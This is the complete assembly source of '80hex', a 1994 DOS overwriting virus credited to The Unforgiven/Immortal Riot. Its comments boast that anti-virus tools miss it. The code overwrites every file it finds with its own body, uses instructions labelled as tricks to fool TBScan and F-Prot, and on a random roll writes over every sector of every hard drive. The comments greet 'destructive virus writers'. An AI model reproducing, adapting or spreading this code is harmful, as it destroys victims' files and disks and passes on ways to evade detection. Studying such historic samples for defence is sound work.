; ------------------------------------------------------------------------------
;                          - 80hex virus -
;              (c) 1994 The Unforgiven/Immortal Riot

; Pay-Load function:
;  This will be dropped to the file c:\dos\keyb.com, that often
;  is called from autoexec.bat, which will result in that all files
;  in DOS being overwritten. Eventually all hds will be trashed as well.

; General-information:
;  It's a simple overwriting virus, BUT not released 'alone' as
;  the purpose as a virus that will infect systems and travel
;  around the world. It's rather an original pay-load, outsmarted
;  by my creative/destructive brain.

;  It's not encrypted, still *NO* anti-virus detects it, this is probably
;  due to its simplistic shape. It's *highly* destructive, and is really
;  more or less a trojan. But it can replicate, so...

;  Greetings to all destructive virus writers!
;               - The Unforgiven/Immortal Riot


                   ;Riot.trivial.80h

.model tiny
.code
org    100h

start:
dec   byte ptr offset files       ; tricking tbscan ! 
add   ah,4eh                      ; tricking f-prot !
mov   dx, offset files
next: int 21h

jnc   open

mov   ah,2ch                      ; Value of 1/100 of a second
int   21h
cmp   dl,79                       ; 20%
jb    quit                        ; 

mov al,2h                         

drive:                            ; Harddrive, seek and destroy!
mov   cx,1                                                       
lea   bx,virus          
cwd                               ; clear dx (ax = <8000h) 
Next_Sector:                      
int   26h                                                                 
inc   dx                
jnc   next_sector                 ; all sectors                                
inc   al                        
jmp   short drive                 ; all drives                                 

quit:
ret

open:
inc   byte ptr offset files

add   ax,3d02h                    
mov   dx, offset 9eh
int   21h

write:
xchg  ax,bx

mov   ah,40h
mov   dx, offset start
mov   cx, endoffile - start
int   21h

close:
sub   ah,2
int   21h

mov   ah,4fh                              
jmp   short next

data:
files db "+.*",0                                       ; => *.*
virus db "Materialism - the religion of today, "       
truth db "ain't it sad?"                               

endoffile:
end start
